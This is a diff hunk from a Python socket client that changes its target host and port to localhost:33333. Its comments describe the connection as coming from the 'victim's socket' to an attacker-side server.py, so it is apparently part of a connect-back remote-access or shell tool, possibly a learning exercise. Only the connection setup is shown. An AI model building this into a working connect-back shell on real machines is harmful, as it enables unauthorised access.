@@ -21,10 +21,8 @@ s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) # it will create a socket for
 
 # it will store static IP of server/ dynamic IP of machine on which server.py file is running
 # it will store port number on which server is listening
-host=""
-port=5050
-
-
+host="localhost"
+port=33333
 
 s.connect((host,port)) # it requests a connection from victim's socket to the specified socket(host,port) passed as arguement which belongs to server
                        # this request is accepted by s.accept() function at server's end and 3-way hanshake mechanism is initiated
